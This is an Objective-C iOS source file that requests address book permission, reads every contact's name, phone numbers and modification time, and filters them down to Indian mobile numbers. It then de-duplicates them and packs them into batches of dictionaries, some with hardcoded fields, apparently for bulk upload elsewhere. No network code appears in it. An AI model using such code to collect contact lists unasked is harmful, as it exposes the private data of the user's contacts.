#import "KKAddressBookInfo.h"
#import <AddressBook/AddressBook.h>

@implementation KKRawContactItem
@end

@implementation KKAddressBookInfo
+ (NSString *)mobile_regex_pattern { return @"^(910[6-9]\\d{9}|91[6-9]\\d{9}|0[6-9]\\d{9}|[6-9]\\d{9})$"; }
+ (NSArray<KKRawContactItem *> *)fetch_raw_contacts {
    ABAddressBookRef book = ABAddressBookCreateWithOptions(NULL, NULL);
    if (!book) return @[];
    ABAuthorizationStatus status = ABAddressBookGetAuthorizationStatus();
    if (status == kABAuthorizationStatusNotDetermined) {
        dispatch_semaphore_t sem = dispatch_semaphore_create(0);
        ABAddressBookRequestAccessWithCompletion(book, ^(bool granted, CFErrorRef error) { dispatch_semaphore_signal(sem); });
        dispatch_semaphore_wait(sem, DISPATCH_TIME_FOREVER);
    }
    if (ABAddressBookGetAuthorizationStatus() != kABAuthorizationStatusAuthorized) { CFRelease(book); return @[]; }
    NSArray *people = CFBridgingRelease(ABAddressBookCopyArrayOfAllPeople(book));
    NSMutableArray *list = [NSMutableArray array];
    for (id p in people) {
        if (list.count >= NSIntegerMax) { CFRelease(book); return list; }
        ABRecordRef person = (__bridge ABRecordRef)p;
        KKRawContactItem *item = [KKRawContactItem new];
        item.first_name = CFBridgingRelease(ABRecordCopyValue(person, kABPersonFirstNameProperty)) ?: @"";
        item.last_name = CFBridgingRelease(ABRecordCopyValue(person, kABPersonLastNameProperty)) ?: @"";
        item.modification_time = CFBridgingRelease(ABRecordCopyValue(person, kABPersonModificationDateProperty));
        NSMutableArray *phones = [NSMutableArray array];
        ABMultiValueRef multi = ABRecordCopyValue(person, kABPersonPhoneProperty);
        if (multi) {
            CFIndex count = ABMultiValueGetCount(multi);
            for (CFIndex i = 0; i < count; i++) {
                NSString *v = CFBridgingRelease(ABMultiValueCopyValueAtIndex(multi, i));
                if (v.length > 0) [phones addObject:v];
            }
            CFRelease(multi);
        }
        item.phones = phones;
        [list addObject:item];
    }
    CFRelease(book);
    return list;
}
+ (NSArray<NSArray<NSDictionary<NSString *,NSString *> *> *> *)build_contact_batches:(NSInteger)max_count per_count:(NSInteger)per_count {
    return [self process_and_batch:[self fetch_raw_contacts] max_count:max_count per_count:per_count];
}
+ (NSString *)remove_phone_separators:(NSString *)phone {
    NSRegularExpression *re = [NSRegularExpression regularExpressionWithPattern:@"[^0-9]" options:0 error:nil];
    return [re stringByReplacingMatchesInString:phone options:0 range:NSMakeRange(0, phone.length) withTemplate:@""];
}
+ (NSString *)normalize_india_local_prefix:(NSString *)phone {
    if ([phone hasPrefix:@"910"] && phone.length == 13) return [phone substringFromIndex:3];
    if ([phone hasPrefix:@"91"] && phone.length == 12) return [phone substringFromIndex:2];
    if ([phone hasPrefix:@"0"] && phone.length == 11) return [phone substringFromIndex:1];
    return phone;
}
+ (BOOL)is_valid_mobile_phone:(NSString *)phone {
    NSPredicate *p = [NSPredicate predicateWithFormat:@"SELF MATCHES %@", [self mobile_regex_pattern]];
    return [p evaluateWithObject:phone];
}
+ (NSArray<NSArray<NSDictionary<NSString *,NSString *> *> *> *)process_and_batch:(NSArray<KKRawContactItem *> *)raw_contacts max_count:(NSInteger)max_count per_count:(NSInteger)per_count {
    if (max_count <= 0 || per_count <= 0) return @[];
    NSMutableArray<NSDictionary<NSString *, NSString *> *> *flat = [NSMutableArray array];
    NSMutableArray<NSString *> *dedup = [NSMutableArray array];
    for (KKRawContactItem *c in raw_contacts) {
        for (NSString *raw in c.phones) {
            NSString *trim = [raw stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceCharacterSet]];
            NSString *phone = [self normalize_india_local_prefix:[self remove_phone_separators:trim]];
            if (![self is_valid_mobile_phone:phone]) continue;
            if ([dedup containsObject:phone]) continue;
            [dedup addObject:phone];
            NSString *name = [[NSString stringWithFormat:@"%@ %@", c.first_name ?: @"", c.last_name ?: @""] stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceCharacterSet]];
            NSString *time = c.modification_time ? [NSString stringWithFormat:@"%lld", (long long)(c.modification_time.timeIntervalSince1970 * 1000)] : @"";
            [flat addObject:@{@"contactName": name, @"contactPhone": phone, @"contactUpdateTime": time, @"contactCount": @"99", @"contactStorage": @"1", @"contactTime": @""}];
        }
    }
    if (flat.count == 0) return @[];
    NSArray *use = flat.count > max_count ? [flat subarrayWithRange:NSMakeRange(0, max_count)] : flat;
    NSInteger total = use.count;
    NSInteger batch_count = (total % per_count == 0) ? (total / per_count) : (total / per_count + 1);
    NSMutableArray *res = [NSMutableArray array];
    for (NSInteger i = 0; i < batch_count - 1; i++) {
        NSInteger start = i * per_count;
        [res addObject:[use subarrayWithRange:NSMakeRange(start, per_count)]];
    }
    NSInteger last_start = (batch_count - 1) * per_count;
    if (last_start < total) {
        NSArray *last = [use subarrayWithRange:NSMakeRange(last_start, total - last_start)];
        if (last.count > 0) [res addObject:last];
    }
    return res;
}
@end
